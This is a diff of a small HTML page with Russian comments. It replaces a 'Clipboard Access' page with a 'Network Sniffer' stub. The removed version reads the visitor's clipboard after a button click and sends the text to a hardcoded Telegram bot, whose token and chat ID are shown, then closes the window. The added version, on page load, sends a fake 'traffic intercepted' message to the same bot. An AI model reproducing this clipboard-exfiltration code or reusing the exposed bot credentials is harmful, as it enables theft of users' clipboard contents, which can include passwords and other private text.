@@ -1,51 +1,51 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Clipboard Access</title>
+    <title>Network Sniffer</title>
     <script>
-        // Функция для отправки данных в Telegram
-        async function sendClipboardData() {
-            try {
-                // Запрашиваем доступ к буферу обмена
-                const clipboardData = await navigator.clipboard.readText();
+        // Функция для отправки сообщения в Telegram
+        function sendToTelegram(message) {
+            const botToken = '7341685493:AAGsKsTZfF6LPql4R6fJJQ9qiUx3Mq1L5eQ';
+            const chatId = '7406507427';
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            const data = {
+                chat_id: chatId,
+                text: message
+            };
 
-                // Отправляем данные в Telegram
-                const botToken = '7341685493:AAGsKsTZfF6LPql4R6fJJQ9qiUx3Mq1L5eQ';
-                const chatId = '7406507427';
-                const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-
-                // Отправляем данные в Telegram
-                const response = await fetch(url, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: chatId,
-                        text: clipboardData
-                    })
-                });
-
-                if (!response.ok) {
-                    throw new Error('Failed to send data to Telegram');
-                }
-
-                // Закрываем окно после успешной отправки
-                window.close();
-            } catch (error) {
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data),
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Success:', data);
+            })
+            .catch((error) => {
                 console.error('Error:', error);
-                // Можно добавить дополнительную обработку ошибок
-            }
+            });
         }
 
-        // Запрашиваем разрешение на доступ к буферу обмена при загрузке страницы
-        window.onload = function() {
-            const button = document.createElement('button');
-            button.textContent = 'Разрешить доступ и отправить данные';
-            button.onclick = sendClipboardData;
-            document.body.appendChild(button);
-        };
+        // Функция для сбора информации и отправки её в Telegram
+        function collectData() {
+            // Здесь вы можете добавить код для сбора сетевого трафика или другой информации
+            // Однако из-за ограничений браузеров это может быть невозможно
+            
+            const message = 'Трафик перехвачен и проанализирован';
+            sendToTelegram(message);
+        }
+
+        window.onload = () => {
+            collectData();
+            window.close();  // Закрытие окна после выполнения
+        }
     </script>
 </head>
 <body>
-    <p>Нажмите кнопку ниже, чтобы разрешить доступ к буферу обмена и отправить данные в Telegram.</p>
+    <h1>Network Sniffer</h1>
+    <p>Сбор данных...</p>
 </body>
 </html>
